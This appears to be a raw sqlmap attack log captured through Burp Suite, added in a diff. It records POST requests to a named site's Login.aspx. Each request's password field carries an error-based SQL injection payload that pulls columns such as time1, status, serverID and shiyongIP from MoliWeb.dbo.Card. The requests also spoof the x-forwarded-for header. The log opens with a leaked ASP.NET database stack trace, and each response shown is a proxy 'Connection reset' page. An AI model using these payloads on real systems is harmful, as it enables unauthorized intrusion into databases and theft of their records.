+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#15]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%202197%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28time1%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20DTLu&s=false
+
+HTTP response [#15] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#16]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%203530%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28time2%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20iuFJ&s=false
+
+HTTP response [#16] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#17]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%205193%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28types%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20JEsd&s=false
+
+HTTP response [#17] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#18]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 501
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%204158%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28status%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20MCGu&s=false
+
+HTTP response [#18] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#19]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 503
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%208841%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28serverID%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20PFIS&s=false
+
+HTTP response [#19] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#20]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 504
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%208380%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28shiyongIP%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20ggBH&s=false
+
+HTTP response [#20] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#21]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 491
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%204852%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MIN%28ISNULL%28CAST%28num%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%3ECHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20hBha&s=false
+
+HTTP response [#21] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#22]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 491
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%207237%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MIN%28ISNULL%28CAST%28num%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%3ECHAR%2849%29%2BCHAR%2853%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20rVzH&s=false
+
+HTTP response [#22] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#23]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 476
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%207590%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MIN%28ISNULL%28CAST%28num%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%3ECHAR%2850%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20WmnK&s=false
+
+HTTP response [#23] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
